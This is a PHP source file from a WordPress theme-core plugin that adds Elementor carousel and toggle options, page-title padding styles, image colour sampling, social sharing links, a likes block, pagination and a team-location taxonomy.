			$data_settings['dots']                 = $settings['gt3_carousel_nav'] == 'dots' ? true : false;
			$data_settings['l10n']                 = array();
			$data_settings['l10n']['prev']         = $settings['gt3_carousel_nav_prev'];
			$data_settings['l10n']['next']         = $settings['gt3_carousel_nav_next'];

			$element->add_render_attribute('_wrapper', 'data-settings', json_encode($data_settings));
			$element->add_render_attribute('_wrapper', 'class', 'gt3_carousel-elementor');
			$element->add_render_attribute('_wrapper', 'class', 'gt3_carousel_items_per_line-'.esc_attr($settings['gt3_carousel_items_per_line']));
			$element->add_render_attribute('_wrapper', 'class', 'gt3_center_mode-'.($data_settings['centerMode'] ? 'true' : 'false'));
			if(!empty($settings['gt3_carousel_items_per_line_mobile'])) {
				$element->add_render_attribute('_wrapper', 'class', 'gt3_carousel_items_per_line_mobile-'.$settings['gt3_carousel_items_per_line_mobile']);
			}
			if(!empty($settings['gt3_carousel_items_per_line_tablet'])) {
				$element->add_render_attribute('_wrapper', 'class', 'gt3_carousel_items_per_line_tablet-'.$settings['gt3_carousel_items_per_line_tablet']);
			}
		}
	}

	add_action('elementor/frontend/column/before_render', 'gt3_column_before_render_options', 10);
}

add_action('elementor/element/image-carousel/section_style_navigation/before_section_end', function($element, $args){
	/* @var \Elementor\Widget_Base $element */
	$element->update_control('arrows_color', array(
		'selectors' => [
			'{{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-prev:before, {{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-prev:after, {{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-next:before, {{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-next:after,{{WRAPPER}} .elementor-swiper-button.elementor-swiper-button-prev, {{WRAPPER}} .elementor-swiper-button.elementor-swiper-button-next' => 'color: {{VALUE}};',
		]
	));
}, 20, 2);

add_action('elementor/frontend/widget/before_render', function($element){

	if($element->get_name() === 'toggle') {
		$settings = $element->get_settings_for_display();

		foreach($settings['tabs'] as $index => $item) {
			$tab_count = $index+1;

			$tab_title_setting_key = implode('.', [ 'tabs', $index, 'tab_title' ]);

			$tab_content_setting_key = implode('.', [ 'tabs', $index, 'tab_content' ]);

			if($item['tab_active']) {
				$element->add_render_attribute($tab_title_setting_key, [
					'class' => [ 'elementor-active' ],
				]);

				$element->add_render_attribute($tab_content_setting_key, [
					'class' => [ 'elementor-active' ],
					'style' => 'display:block;'
				]);
			}

			if($settings['add_question_marker']) {
				$element->add_render_attribute($tab_title_setting_key, [
					'class'                => [ 'add_question_marker' ],
					'data-question_marker' => isset($settings['question_marker']) ? $settings['question_marker'] : 'Q'
				]);
			}

		}
	}

}, 10);

add_action('elementor/element/toggle/section_toggle/before_section_end', function($element, $args){
	$tabs_settings = $element->get_controls('tabs');

	$tabs_fields = $tabs_settings['fields'];

	$tab_active = array(
		'tab_active' => array(
			'label'        => __('Active', 'gt3_themes_core'),
			'type'         => Elementor\Controls_Manager::SWITCHER,
			'default'      => '',
			'name'         => 'tab_active',
			'return_value' => 'active',
		)
	);

	$element->update_control('tabs', array(
		'fields' => $tab_active+$tabs_fields
	));

	$element->add_control(
		'add_question_marker',
		array(
			'label'        => esc_html__('Add Question Marker', 'gt3_themes_core'),
			'type'         => Elementor\Controls_Manager::SWITCHER,
			'prefix_class' => 'gt3_tabs_marker-',
			/*'separator' => 'after',*/
		),
		array(
			'position' => array(
				'type' => 'control',
				'at'   => 'after',
				'of'   => 'tabs'
			)
		)
	);

	$element->add_control(
		'question_marker_active_color',
		array(
			'label'     => __('Question Marker Active Color', 'gt3_themes_core'),
			'type'      => Elementor\Controls_Manager::COLOR,
			'scheme'    => [
				'type'  => Elementor\Scheme_Color::get_type(),
				'value' => Elementor\Scheme_Color::COLOR_1,
			],
			'default'   => '',
			'condition' => array(
				'add_question_marker' => 'yes'
			),
			'selectors' => [
				'{{WRAPPER}} .elementor-tab-title.elementor-active.add_question_marker:before' => 'color: {{VALUE}};',
			],
		),
		array(
			'position' => array(
				'type' => 'control',
				'at'   => 'after',
				'of'   => 'add_question_marker'
			)
		)
	);

	$element->add_control(
		'question_marker_active_bg_color',
		array(
			'label'     => __('Question Marker Active Background Color', 'gt3_themes_core'),
			'type'      => Elementor\Controls_Manager::COLOR,
			'scheme'    => [
				'type'  => Elementor\Scheme_Color::get_type(),
				'value' => Elementor\Scheme_Color::COLOR_1,
			],
			'default'   => '',
			'condition' => array(
				'add_question_marker' => 'yes'
			),
			'selectors' => [
				'{{WRAPPER}} .elementor-tab-title.elementor-active.add_question_marker:before' => 'background-color: {{VALUE}};',
			],
		),
		array(
			'position' => array(
				'type' => 'control',
				'at'   => 'after',
				'of'   => 'add_question_marker'
			)
		)
	);

	$element->add_control(
		'question_marker_color',
		array(
			'label'     => __('Question Marker Color', 'gt3_themes_core'),
			'type'      => Elementor\Controls_Manager::COLOR,
			'scheme'    => [
				'type'  => Elementor\Scheme_Color::get_type(),
				'value' => Elementor\Scheme_Color::COLOR_1,
			],
			'default'   => '',
			'condition' => array(
				'add_question_marker' => 'yes'
			),
			'selectors' => [
				'{{WRAPPER}} .elementor-tab-title.add_question_marker:before' => 'color: {{VALUE}};',
			],
		),
		array(
			'position' => array(
				'type' => 'control',
				'at'   => 'after',
				'of'   => 'add_question_marker'
			)
		)
	);

	$element->add_control(
		'question_marker_bg_color',
		array(
			'label'     => __('Question Marker Background Color', 'gt3_themes_core'),
			'type'      => Elementor\Controls_Manager::COLOR,
			'scheme'    => [
				'type'  => Elementor\Scheme_Color::get_type(),
				'value' => Elementor\Scheme_Color::COLOR_1,
			],
			'default'   => '',
			'condition' => array(
				'add_question_marker' => 'yes'
			),
			'selectors' => [
				'{{WRAPPER}} .elementor-tab-title.add_question_marker:before' => 'background-color: {{VALUE}};',
			],
		),
		array(
			'position' => array(
				'type' => 'control',
				'at'   => 'after',
				'of'   => 'add_question_marker'
			)
		)
	);

	$element->add_control(
		'question_marker',
		array(
			'label'     => esc_html__('Question Marker', 'gt3_themes_core'),
			'type'      => Elementor\Controls_Manager::TEXT,
			'default'   => __('Q', 'elementor'),
			'condition' => array(
				'add_question_marker' => 'yes'
			),
		),
		array(
			'position' => array(
				'type' => 'control',
				'at'   => 'after',
				'of'   => 'add_question_marker'
			)
		)
	);


}, 20, 3);

add_action('elementor/element/toggle/section_style_navigation/before_section_end', function($element, $args){
	/* @var \Elementor\Widget_Base $element */
	$element->update_control('arrows_color', array(
		'selectors' => [
			'{{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-prev:before, {{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-prev:after, {{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-next:before, {{WRAPPER}} .elementor-image-carousel-wrapper .slick-slider .slick-next:after' => 'color: {{VALUE}};',
		]
	));
}, 20, 2);

if(!function_exists('gt3_get_top_offset_for_page_title')) {
	function gt3_get_top_offset_for_page_title($header_on_bg, $tablet_header_on_bg, $mobile_header_on_bg, $responsive_header_height){

		$custom_page_title_style = '';
		if(is_array($responsive_header_height) && !empty($responsive_header_height['desktop_height'])) {
			if((bool) $header_on_bg && $responsive_header_height['desktop_height']) {
				$custom_page_title_style .= ".gt3-page-title_wrapper .gt3-page-title{padding-top: ".(int) $responsive_header_height['desktop_height']."px;}";
			}
			if((bool) $tablet_header_on_bg) {
				$custom_page_title_style .= "@media only screen and (max-width: 1200px){.gt3-page-title_wrapper .gt3-page-title{padding-top: ".(int) $responsive_header_height['tablet_height']."px;}}";
			} else {
				$custom_page_title_style .= "@media only screen and (max-width: 1200px){.gt3-page-title_wrapper .gt3-page-title{padding-top: 20px;padding-bottom: 20px;}}";
			}
			if((bool) $mobile_header_on_bg && $responsive_header_height['mobile_height']) {
				$custom_page_title_style .= "@media only screen and (max-width: 767px){.gt3-page-title_wrapper .gt3-page-title{padding-top: ".(int) $responsive_header_height['mobile_height']."px;}}";
			} else {
				$custom_page_title_style .= "@media only screen and (max-width: 767px){.gt3-page-title_wrapper .gt3-page-title{padding-top: 20px;padding-bottom: 20px;}}";
			}
			echo ' <script>
                var custom_page_title_style = "'.$custom_page_title_style.'";
                if (document.getElementById("custom_page_title_style")) {
                    document.getElementById("custom_page_title_style").innerHTML += custom_page_title_style;
                } else if (custom_page_title_style !== "") {
                    document.body.innerHTML += \'<style id="custom_page_title_style">\'+custom_page_title_style+\'</style>\';
                }</script>';
		}
	}
}

if(!function_exists('getSolidColorFromImage')) {
	function getSolidColorFromImage($filepath){
		$attach_id   = get_post_thumbnail_id(get_the_ID());
		$attach_path = get_attached_file($attach_id);
		$upload_dir  = wp_upload_dir();
		$attach_file = str_replace($upload_dir['basedir'], $upload_dir['baseurl'], $attach_path);

		if(empty($attach_id) || ($attach_file != $filepath)) {
			global $wpdb;
			$attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $filepath));
			if(!empty($attachment[0])) {
				$attach_id = $attachment[0];
			}
		}

		$solid_color = get_post_meta($attach_id, 'solid_color', true);

		if(empty($attach_id)) {
			return '#D3D3D3';
		} else {
			$filepath = get_attached_file($attach_id);
		}

		if(!empty($solid_color)) {
			return $solid_color;
		}

		$type = wp_check_filetype($filepath); // [] if you don't have exif you could use getImageSize()
		if(!empty($type) && is_array($type) && !empty($type['ext']) && file_exists($filepath)) {
			$type = $type['ext'];
		} else {
			return '#D3D3D3';
		}
		$allowedTypes = array(
			'gif',  // [] gif
			'jpg',  // [] jpg
			'png',  // [] png
			'bmp'   // [] bmp
		);
		if(!in_array($type, $allowedTypes)) {
			return '#D3D3D3';
		}
		$im = false;
		switch($type) {
			case 'gif' :
				if(function_exists('imageCreateFromGif')) {
					$im = imageCreateFromGif($filepath);
				}
				break;
			case 'jpg' :
				if(function_exists('imageCreateFromJpeg')) {
					$im = imageCreateFromJpeg($filepath);
				}
				break;
			case 'png' :
				if(function_exists('imageCreateFromPng')) {
					$im = imageCreateFromPng($filepath);
				}
				break;
			case 'bmp' :
				if(function_exists('imageCreateFromBmp')) {
					$im = imageCreateFromBmp($filepath);
				}
				break;
		}

		if($im) {
			$thumb = imagecreatetruecolor(1, 1);
			imagecopyresampled($thumb, $im, 0, 0, 0, 0, 1, 1, imagesx($im), imagesy($im));
			$mainColor = strtoupper(dechex((int) imagecolorat($thumb, 0, 0)));
			if(strlen($mainColor) < 6) {
				$mainColor = '0'.$mainColor;
			}
			update_post_meta($attach_id, 'solid_color', $mainColor);

			return $mainColor;
		} else {
			return '#D3D3D3';
		}
	}
}

if(!function_exists('gt3_add_widget_to_theme')) {
	function gt3_add_widget_to_theme($extra_widget = array()){
		$widgets = apply_filters('gt3/core/widgets_in_themes',
			array_merge(array(
				'posts',
				'flickr',
				'title',
			), $extra_widget));

		if (is_array($widgets) && count($widgets)) {
			foreach($widgets as $widget) {
				$path = plugin_dir_path(dirname(__FILE__)).'core/widgets/'.$widget.'.php';
				if (is_readable($path)) {
					require_once $path;
				}
			}
		}
	}
}

require_once plugin_dir_path(dirname(__FILE__)).'core/class-gt3-woocommerce-adjacent-products.php';

if(!function_exists('gt3_blog_post_sharing')) {
	function gt3_blog_post_sharing($show_share = false, $featured_image = false){
		if($show_share == "1") { ?>
			<!-- post share block -->
			<div class="post_share_block">
				<a href="<?php echo esc_js("javascript:void(0)"); ?>"><?php echo apply_filters( 'gt3_sharing_title', '<span class="sharing_title">' . esc_html__('Share', 'gt3_themes_core') . '</span>') ?></a>
				<div class="post_share_wrap">
					<ul>
						<?php
						echo '<li class="post_share-facebook"><a target="_blank" href="'.esc_url('https://www.facebook.com/share.php?u='.get_permalink()).'"><span class="fa fa-facebook"></span></a></li>';
						echo '<li class="post_share-twitter"><a target="_blank" href="'.esc_url('https://twitter.com/intent/tweet?text='.get_the_title().'&amp;url='.get_permalink()).'"><span class="fa fa-twitter"></span></a></li>';
						if(strlen($featured_image[0]) > 0) {
							echo '<li class="post_share-pinterest"><a target="_blank" href="'.esc_url('https://pinterest.com/pin/create/button/?url='.get_permalink().'&media='.$featured_image[0]).'" data-elementor-open-lightbox="no"><span class="fa fa-pinterest"></span></a></li>';
						}
						echo '<li class="post_share-linkedin"><a target="_blank" href="'.esc_url('https://www.linkedin.com/shareArticle?mini=true&url='.get_permalink().'&title='.esc_attr(get_the_title()).'&source='.get_bloginfo("name")).'"><span class="fa fa-linkedin"></span></a></li>';
						/* Email Link */
						ob_start();
						the_title('', '', true);
						$email_title = ob_get_clean();
						ob_start();
						the_permalink();
						$email_permalink = ob_get_clean();
						$email_link      = 'mailto:?subject='.$email_title.'&body='.$email_permalink;
						echo '<li class="post_share-mail"><a target="_blank" href="'.$email_link.'"><span class="fa fa-envelope"></span></a></li>';
						?>
					</ul>
				</div>
			</div>
			<!-- //post share block -->
		<?php }
	}
}

if(!function_exists('gt3_blog_post_likes')) {
	function gt3_blog_post_likes($show_likes = false, $all_likes = array()){
		if($show_likes == "1") {
			echo '<div class="likes_block post_likes_add '.(isset($_COOKIE['like_post'.get_the_ID()]) ? "already_liked" : "").'" data-postid="'.esc_attr(get_the_ID()).'" data-modify="like_post">
                <span class="fa fa-heart-o icon"></span>
                <span class="like_count">'.((isset($all_likes[get_the_ID()]) && $all_likes[get_the_ID()] > 0) ? $all_likes[get_the_ID()] : 0).'</span>
            </div>';
		}
	}
}

#Custom paging
if(!function_exists('gt3_get_theme_pagination')) {
	function gt3_get_theme_pagination($range = 5, $type = "", $max_page = false, $paged_arg = false){
		if($type == "show_in_shortcodes") {
			global $paged, $my_wp_query;
		} else {
			global $paged, $my_wp_query, $wp_query;
			if(is_null($my_wp_query)) {
				$my_wp_query = $wp_query;
			}
		}

		if(empty($paged) || !$paged_arg) {
			$paged = get_query_var('page') ? get_query_var('page') : (get_query_var('paged') ? get_query_var('paged') : 1);
		}

		$compile = '';
		if(!$max_page) {
			$max_page = $my_wp_query->max_num_pages;
		}

		if($max_page > 1) {
			$compile .= '<ul class="pagerblock">';
		}
		if($paged > 1) {
			$compile .= '<li class="prev_page"><a href="'.esc_url(get_pagenum_link($paged-1)).'"><i class="fa fa-angle-left"></i></a></li>';
		}
		if($max_page > 1) {
			if(!$paged) {
				$paged = 1;
			}
			if($max_page > $range) {
				if($paged < $range) {
					for($i = 1; $i <= ($range+1); $i++) {
						$compile .= "<li><a href='".esc_url(get_pagenum_link($i))."'";
						if($i == $paged) {
							$compile .= " class='current'";
						}
						$compile .= ">$i</a></li>";
					}
				} else if($paged >= ($max_page-ceil(($range/2)))) {
					for($i = $max_page-$range; $i <= $max_page; $i++) {
						$compile .= "<li><a href='".esc_url(get_pagenum_link($i))."'";
						if($i == $paged) {
							$compile .= " class='current'";
						}
						$compile .= ">$i</a></li>";
					}
				} else if($paged >= $range && $paged < ($max_page-ceil(($range/2)))) {
					for($i = ($paged-ceil($range/2)); $i <= ($paged+ceil(($range/2))); $i++) {
						$compile .= "<li><a href='".esc_url(get_pagenum_link($i))."'";
						if($i == $paged) {
							$compile .= " class='current'";
						}
						$compile .= ">$i</a></li>";
					}
				}
			} else {
				for($i = 1; $i <= $max_page; $i++) {
					$compile .= "<li><a href='".esc_url(get_pagenum_link($i))."'";
					if($i == $paged) {
						$compile .= " class='current'";
					}
					$compile .= ">$i</a></li>";
				}
			}
		}
		if($paged < $max_page) {
			$compile .= '<li class="next_page"><a href="'.esc_url(get_pagenum_link($paged+1)).'"><i class="fa fa-angle-right"></i></a></li>';
		}
		if($max_page > 1) {
			$compile .= '</ul>';
		}

		return $compile;
	}
}

if(!function_exists('gt3_add_location_taxonomy')) {
	function gt3_add_location_taxonomy(){
		$single_label = apply_filters("gt3_team_single_label_filter", esc_html__('Team', 'gt3_themes_core'));
		$labels       = array(
			'name'              => wp_sprintf(__('%s Locations', 'gt3_themes_core'), $single_label),
			'singular_name'     => wp_sprintf(__('%s Location', 'gt3_themes_core'), $single_label),
			'search_items'      => wp_sprintf(__('Search %s Locations', 'gt3_themes_core'), $single_label),
			'all_items'         => wp_sprintf(__('All %s Locations', 'gt3_themes_core'), $single_label),
			'parent_item'       => wp_sprintf(__('Parent %s Location', 'gt3_themes_core'), $single_label),
			'parent_item_colon' => wp_sprintf(__('Parent %s Location:', 'gt3_themes_core'), $single_label),
			'edit_item'         => wp_sprintf(__('Edit %s Location', 'gt3_themes_core'), $single_label),
			'update_item'       => wp_sprintf(__('Update %s Location', 'gt3_themes_core'), $single_label),
			'add_new_item'      => wp_sprintf(__('Add New %s Location', 'gt3_themes_core'), $single_label),
			'new_item_name'     => wp_sprintf(__('New %s Location Name', 'gt3_themes_core'), $single_label),
			'menu_name'         => wp_sprintf(__('%s Locations', 'gt3_themes_core'), $single_label),
		);

		$slug_option = function_exists('gt3_option') ? gt3_option('team_slug') : '';
		$slug        = empty($slug_option) ? 'team' : sanitize_title($slug_option);

		register_taxonomy(
			'team_location',
			array( 'team' ),
			array(
				'hierarchical'      => true,
				'labels'            => $labels,
				'show_ui'           => true,
				'show_admin_column' => true,
				'query_var'         => true,
				'rewrite'           => array( 'slug' => $slug.'-'.__('location', 'gt3_themes_core') ),
			));
	}
}

add_image_size('gt3theme_notebook', 1366, 0, false);
add_image_size('gt3theme_fhd', 1920, 0, false);
add_image_size('gt3theme_mobile', 480, 0, false);

add_filter('intermediate_image_sizes', function($image_sizes){
	$image_sizes = array_diff($image_sizes,
		array(
			'gt3theme_notebook',
			'gt3theme_fhd',
			'gt3-admin-post-featured-image'
		)
	);

	return $image_sizes;
});

add_filter('image_size_names_choose', function($image_sizes){
	$image_sizes = array_diff_key($image_sizes,
		array(
			'gt3theme_notebook'             => true,
			'gt3theme_fhd'                  => true,
			'gt3-admin-post-featured-image' => true
		)
	);

	return $image_sizes;
});

add_filter('max_srcset_image_width', function(){
	return apply_filters('gt3/core/max_srcset_image_width', 1920);
}, 100);
